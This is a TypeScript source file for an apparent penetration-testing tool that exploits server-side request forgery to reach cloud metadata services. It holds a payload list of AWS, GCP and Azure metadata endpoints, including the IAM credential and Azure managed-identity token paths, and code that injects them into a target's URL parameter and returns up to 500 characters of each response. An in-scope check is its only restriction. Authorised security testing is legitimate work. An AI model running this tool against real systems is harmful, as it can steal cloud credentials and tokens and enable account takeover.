import { z } from 'zod';
import { isInScope } from '../../config.js';

export const cloudMetadataSchema = z.object({
  url: z.string().describe('Target URL with SSRF-capable parameter to test cloud metadata access'),
  parameter: z.string().optional().describe('URL parameter to inject into'),
  provider: z.enum(['aws', 'gcp', 'azure', 'all']).default('all')
    .describe('Cloud provider to test'),
  timeout: z.number().default(10000).describe('Per-request timeout in milliseconds'),
});

export type CloudMetadataInput = z.infer<typeof cloudMetadataSchema>;

interface MetadataResult {
  provider: string;
  endpoint: string;
  accessible: boolean;
  data?: string;
}

const METADATA_ENDPOINTS: Array<{ provider: string; url: string; headers?: Record<string, string> }> = [
  // AWS IMDSv1
  { provider: 'aws', url: 'http://169.254.169.254/latest/meta-data/' },
  { provider: 'aws', url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
  { provider: 'aws', url: 'http://169.254.169.254/latest/user-data' },
  // AWS IMDSv2 (requires token — if reachable, v1 may also work)
  { provider: 'aws', url: 'http://169.254.169.254/latest/api/token', headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' } },
  // GCP
  { provider: 'gcp', url: 'http://metadata.google.internal/computeMetadata/v1/', headers: { 'Metadata-Flavor': 'Google' } },
  { provider: 'gcp', url: 'http://169.254.169.254/computeMetadata/v1/project/project-id', headers: { 'Metadata-Flavor': 'Google' } },
  // Azure
  { provider: 'azure', url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', headers: { 'Metadata': 'true' } },
  { provider: 'azure', url: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', headers: { 'Metadata': 'true' } },
];

export async function cloudMetadata(input: CloudMetadataInput): Promise<{
  success: boolean;
  url: string;
  results: MetadataResult[];
  vulnerable: boolean;
  error?: string;
}> {
  const { url, parameter, provider, timeout } = input;

  let hostname: string;
  try {
    hostname = new URL(url).hostname;
  } catch {
    return { success: false, url, results: [], vulnerable: false, error: 'Invalid URL' };
  }

  if (!isInScope(hostname)) {
    return { success: false, url, results: [], vulnerable: false, error: `Target ${hostname} is not in scope.` };
  }

  const targetParam = parameter || detectParam(url);
  if (!targetParam) {
    return { success: false, url, results: [], vulnerable: false, error: 'No parameter detected to inject into.' };
  }

  const endpoints = METADATA_ENDPOINTS.filter(e =>
    provider === 'all' || e.provider === provider
  );

  const results: MetadataResult[] = [];

  for (const ep of endpoints) {
    const parsed = new URL(url);
    parsed.searchParams.set(targetParam, ep.url);

    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeout);

      const response = await fetch(parsed.toString(), {
        headers: { 'User-Agent': 'mcp-vanguard/2.0' },
        signal: controller.signal,
        redirect: 'follow',
      });
      clearTimeout(timer);

      const body = await response.text();
      const accessible = response.status === 200 && body.length > 0 && !body.includes('<!DOCTYPE');

      results.push({
        provider: ep.provider,
        endpoint: ep.url,
        accessible,
        data: accessible ? body.slice(0, 500) : undefined,
      });
    } catch {
      results.push({ provider: ep.provider, endpoint: ep.url, accessible: false });
    }
  }

  return {
    success: true,
    url,
    results,
    vulnerable: results.some(r => r.accessible),
  };
}

function detectParam(url: string): string | null {
  try {
    const parsed = new URL(url);
    for (const [key] of parsed.searchParams) {
      if (['url', 'uri', 'path', 'fetch', 'redirect', 'target', 'dest'].includes(key.toLowerCase())) {
        return key;
      }
    }
    return [...parsed.searchParams.keys()][0] || null;
  } catch {
    return null;
  }
}
